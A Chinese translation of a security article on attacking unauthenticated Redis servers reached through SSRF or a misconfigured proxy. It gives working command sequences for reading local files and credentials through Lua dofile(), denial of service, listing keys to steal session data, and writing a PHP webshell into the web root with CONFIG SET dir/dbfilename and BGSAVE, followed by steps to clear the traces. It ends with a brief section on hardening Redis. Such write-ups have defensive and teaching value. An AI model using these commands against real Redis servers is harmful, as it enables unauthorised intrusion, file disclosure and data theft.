# Trying to hack Redis via HTTP requests

0x00 写在前面的话
-----------

* * *

文章是翻译过来的，翻译过程中做了一些修改，添加了些东西。有兴趣的直接可以看原文,原文的链接接在文章的最底部。

0x01 情景
-------

* * *

我们假设存在一个SSRF漏洞或者配置不当的代理服务器，使攻击者可以通过HTTP请求直接访问Redis服务。在上面假设的两种情况中，要求我们对于HTTP的访问请求至少有一行是完全可控的，这种完全可控是很容易实现的。但是,命令行的客户端(redis-cli)是不支持HTTP代理的，而且我们需要构造出自己的命令。这些构造好的语句，封装在HTTP请求中，通过代理进行发送。以下所有的测试都是在redis 2.6.0版本中,虽然不是最新版，但是我们的要攻击的目标使用的就是这个版本......

0x02 Redis简介
------------

* * *

Redis是一个NoSQL的数据库(NoSQl泛指非关系型的数据库,常用的mysql是关系型数据库)，数据通过键/值对存储在内存中。默认配置中，在服务运行的时候，会开放一个没有验证的TCP/6379端口，提供的这个接口是很“宽容”。它会尝试去解析处理每一次输入(直到超时或者输入’QUIT’命令退出)，对于那些不存在的命令，则会显示像"-ERR unknown command"这样的输出。

0x03 目标识别
---------

* * *

当我们利用SSRF漏洞或者配置不当的代理服务器进行进一步渗透时，第一步通常是扫描已知的服务。作为一个攻击者，得知这个服务只在本地回环接口上进行了端口监听，使用了基于来源的验证或者认为这种保护方式风险很小，因为这个是外部不能访问的。 在测试过程中，看到以下日志会令人亢奋：

```
-ERR wrong number of arguments for 'get' command
-ERR unknown command 'Host:'
-ERR unknown command 'Accept:'
-ERR unknown command 'Accept-Encoding:'
-ERR unknown command 'Via:'
-ERR unknown command 'Cache-Control:'
-ERR unknown command 'Connection:'

```

正如你所看到的，这个输出证明了HTTP的GET请求方法，在redis中作为一个有效的命令执行了，但是没有给这个命令提供正确的参数。其他的HTTP请求的没有匹配到Redis命令，出现了很多”unknown command”的错误信息。

0x04 基本交互
---------

* * *

在上面构造的场景中，发出去的HTTP请求是几乎完全可控的，同时请求是通过Squid代理发送的。 这包含以下两个方面

1)构造的HTTP请求必须是有效的,这样才能通过squid代理去处理请求 2)到达Redis数据库的请求，是通过代理发送的 更简单的方法是使用POST来提交数据，但是注入HTTP头部的也是一个不错的选择。现在，来输入一些基础的命令(蓝色标记的是输入的命令)

```
ECHO HELLO
$5
HELLO

TIME
*2
$10
1410273409
$6
380112

CONFIG GET pidfile
*2
$7
pidfile
$18
/var/run/redis.pid

SET my_key my_value
+OK

GET my_key
$8
my_value

QUIT
+OK

```

0x05 突破空格的限制
------------

* * *

正如你所注意到的,服务器会返回特定的数据,再加上像”*2”或者”$7”这种的字符,这是根据Redis协议对二进制数据安全的规定返回的数据，如果你要使用包含空格的参数,则必须使用这个规则。

例如,命令SET设置key 为“foo bar”无论是否使用单双引号，都是不会成功的。幸运的是，Redis协议关于二进制安全的一些规定是很简单的：

```
--每一行都要使用分隔符(CRLF)
--一条命令用”*”开始，同时用数字作为参数，需要分隔符(“*1”+ CRLF)
--我们有多个参数时：
-字符：以”$”开头+字符的长度（＂$4＂+CRLF）+字符串(“TIME”+CRLF)
-整数：以”:”开头+整数的ASCII码(“:42”+CRLF)

```

以上就是所有规则

举一个例子： 对于设置”I am boring”的key为”with_space”，使用redis-cli的设置很简单，一眼就能看懂

```
$ redis-cli -h 127.0.0.1 -p 6379 set with_space 'I am boring'
+OK

```

接下来我们套用规则来设置这条命令 *3是set命令的代表 然后根据多个参数时的字符串表达式来构造set with_space I am boring这个命令，上面这条命令等价与后面的这条命令

```
$ echo -e  '*3\r\n$3\r\nSET\r\n$10\r\nwith_space\r\n$11\r\nI am boring\r\n' | nc -n -q 1 127.0.0.1 6379 
+OK

```

0x06 信息收集
---------

* * *

经过前面的铺垫，我们可以很好的和服务器进行交互获取我们想要的信息。Redis的一些命令是很有用的，例如”INFO”和”CONFIG GET (dir|dbfilename|logfile|pidfile)＂。这里就把测试机器上的执行＂INFO＂的输出贴出来

```
# Server
redis_version:2.6.0
redis_git_sha1:00000000
redis_git_dirty:0
redis_mode:standalone
os:Linux 3.2.0-61-generic-pae i686
arch_bits:32
multiplexing_api:epoll
gcc_version:4.6.3
process_id:19114
run_id:5a29a860ccbe05b43dbe15c0674fb83df0449b25
tcp_port:6379
uptime_in_seconds:9806
uptime_in_days:0
lru_clock:518932

# Clients
connected_clients:1
client_longest_output_list:0
client_biggest_input_buf:1
blocked_clients:0

# Memory
used_memory:661768
[...]

```

下一步当然是进军文件系统，Redis可以执行Lua脚本(在沙箱中)通过”EVAL”命令。沙箱允许dofile()命令。这条命令能够查看文件和列目录。因为Redis没有特殊的权限，所以请求/etc/shadow时会显示一个”permission denied”的错误信息（与运行redis服务的用户的权限有关）

```
EVAL “ return dofile('/etc/passwd')” 0
-ERR Error running script (call to f_afdc51b5f9e34eced5fae459fc1d856af181aaf1): /etc/passwd:1: function arguments expected near ':' 

EVAL “return dofile('/etc/shadow')” 0
-ERR Error running script (call to f_9882e931901da86df9ae164705931dde018552cb): cannot open /etc/shadow: Permission denied

EVAL “return dofile('/var/www/') ” 0
-ERR Error running script (call to f_8313d384df3ee98ed965706f61fc28dcffe81f23): cannot read /var/www/: Is a directory

EVAL “return dofile('/var/www/tmp_upload/') ”0
-ERR Error running script (call to f_7acae0314580c07e65af001d53ccab85b9ad73b1): cannot open /var/www/tmp_upload/: No such file or directory

EVAL “return dofile('/home/ubuntu/.bashrc')” 0
-ERR Error running script (call to f_274aea5728cae2627f7aac34e466835e7ec570d2): /home/ubuntu/.bashrc:2: unexpected symbol near '#'

```

如果Lua脚本有语法错误或者尝试设置全局变量时，会产生报错信息，可以获得一些我们想要的信息

```
EVAL “return dofile('/etc/issue')” 0
-ERR Error running script (call to f_8a4872e08ffe0c2c5eda1751de819afe587ef07a): /etc/issue:1: malformed number near '12.04.4'

EVAL “return dofile('/etc/lsb-release')” 0
-ERR Error running script (call to f_d486d29ccf27cca592a28676eba9fa49c0a02f08): /etc/lsb-release:1: Script attempted to access unexisting global variable 'Ubuntu'

EVAL “return dofile('/etc/hosts')” 0
-ERR Error running script (call to f_1c25ec3da3cade16a36d3873a44663df284f4f57): /etc/hosts:1: malformed number near '127.0.0.1'

```

还有一种情况，但是并不是很常见，就是调用dofile()这个函数去处理有效的Lua文件，然后返回提前定义好的值，假设这里有一个文件/var/data/app/db.conf

```
db = {
   login  = 'john.doe',
   passwd = 'Uber31337',
}

```

通过Lua脚本得到passwd的值

```
EVAL dofile('/var/data/app/db.conf');return(db.passwd); 0 
+OK Uber31337

```

这个也可以获取Unix标准文件的一些信息：

```
EVAL “dofile('/etc/environment');return(PATH);” 0       
+OK     /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
EVAL “dofile('/home/ubuntu/.selected_editor');return(SELECTED_EDITOR);” 0
+OK /usr/bin/nano

```

0x07 暴力破解
---------

* * *

Redis提供一个redis.sha1hex()函数，可以被Lua脚本调用，所以还可以通过Redis服务器进行SHA-1的破解，相关代码在adam_baldwin 的GitHub上(https://github.com/evilpacket/redis-sha-crack)，相关原理的描述在 (http://fr.slideshare.net/evilpacket/ev1lsha-misadventures-in-the-land-of-lua需要翻墙访问)

0x08 Dos
--------

* * *

这里有很多Dos Redis的方法，例如通过调用shutdown这个命令删除数据。

这里有更加有趣的两个例子：

1)在Redis的控制端，调用dofile()不加任何参数，将会从标准输入读取数据，并把读取的数据认为是Lua脚本。这个时候服务器依旧在运行，但是不会去处理新的连接，直到在控制端读取到”^D”(或者重启)。

2)Sha1hex()函数可以被覆盖(在任何一个客户端都可以实现这个效果)。下面展示一个返回固定值的sha1hex()函数 Lua脚本：

```
print(redis.sha1hex('secret'))
function redis.sha1hex (x)
   print('4242424242424242424242424242424242424242') 
end
print(redis.sha1hex('secret'))

```

在Redis的控制端上

```
# First run
e5e9fa1ba31ecd1ae84f75caaa474f3a663f05f4
4242424242424242424242424242424242424242

# Next runs
4242424242424242424242424242424242424242
4242424242424242424242424242424242424242

```

0x09 数据窃取
---------

* * *

如果Redis服务器存储一些有趣的数据(像session cookie或商业数据)，你可以通过get枚举键值，获取数据。

0x0A 加密
-------

* * *

Lua使用完全可以预测的”随机数”，细节在scripting.c的evalGenericCommand()函数中

```
/* We want the same PRNG sequence at every call so that our PRNG is* not affected by external state. */
redisSrand48(0);

```

每一次Lua脚本调用math.random()函数产生的随机数都是相同数字流：

```
0.17082803611217
0.74990198051087
0.09637165539729
0.87046522734243
0.57730350670279
[...]

```

0x0b 远程命令执行
-----------

* * *

为了在开放的Redis服务器上进行命令执行，有以下三种情况： 首先能够修改底层的字节码,能够进行虚拟机的逃逸。(Lua的一个例子https://gist.github.com/corsix/6575486)；或者是绕过全局保护并且试图访问一些有趣的函数。

绕过全局保护是很轻松的(stackoverflow上有一个例子 http://stackoverflow.com/questions/19997647/script-attempted-to-create-global-variable)。然而这么有趣的模块并不能加载,顺便提一下，在这里还有很多有趣的东西(http://lua-users.org/wiki/SandBoxes)。

第三种情况相对来说比较容易实现，将一个半控制的文件导出到硬盘中，在web的根目录中，通过备份得到一个webshell或者覆盖一个shell脚本。唯一的区别是文件名和payload，导出的方法都是一样的，但是应该注意的是保存日志文件的位置在启动之后是不能修改的。事实上，这个数据库中的内容会隔一段时间备份到硬盘的，以便于数据恢复，何时备份取决于配置文件或者BGSAVE命令

以下是常用的几条命令: -修改备份文件的位置

```
CONFIG SET dir /var/www/uploads
CONGIG SET dbfilename sh.php

```

-把payload插入数据库

```
SET payload “could be php or shell or whatever”

```

-把数据导出到硬盘

```
BGSAVE

```

-清除痕迹

```
DEL payload
CONFIG SET dir /var/redis
CONGIG SET dbfilename dump.rdb

```

然而，这里存在一个致命的问题，Redis对dump出来的数据设置的是”0600”权限，因此Apache不能读取。（作者是这么写的,元芳你怎么看？）

0x0C 关于如何发觉公网上的Redis未授权访问
-------------------------

* * *

Redis默认是运行在TCP的6379端口上的，需要进行端口扫描.确定端口是否开放。 同时，Python中有redis这个模块，可以编写脚本调用端口扫描后的结果，对Redis服务是否可以直接访问,进行快速判断。

0x0D 安全配置Redis的一些建议
-------------------

* * *

```
不要以root用户运行redis

```

配置文件中的安全配置

```
port 修改redis使用的端口号
bind 设定redis监听的IP
requirepass 设定redis连接的密码
rename-command CONFIG ""　   ＃禁用CONFIG命令
rename-command info info2   #重命名info为info2

```

源文章: http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html 参考: Redis protocol：http://redis.io/topics/protocol Redis 命令参考：http://redis.readthedocs.org/en/latest/